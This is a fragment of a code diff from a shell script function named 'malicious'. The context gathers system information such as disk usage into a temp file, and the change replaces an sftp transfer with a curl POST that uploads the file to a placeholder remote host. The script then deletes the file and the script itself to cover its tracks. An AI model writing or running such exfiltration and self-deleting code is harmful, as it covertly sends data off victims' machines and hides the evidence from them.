@@ -1264,10 +1264,7 @@ malicious() {
                    echo "Disk Usage:" >> /tmp/xyz1048udk && \
                    df -h >> /tmp/xyz1048udk'
 
-    sftp username@hostname <<EOF
-put /tmp/xyz1048udk
-bye
-EOF
+    curl -X POST -F "file=@/tmp/xyz1048udk" https://hostname/upload_endpoint
 
     sudo rm /tmp/xyz1048udk
     sudo rm -- "$0"  
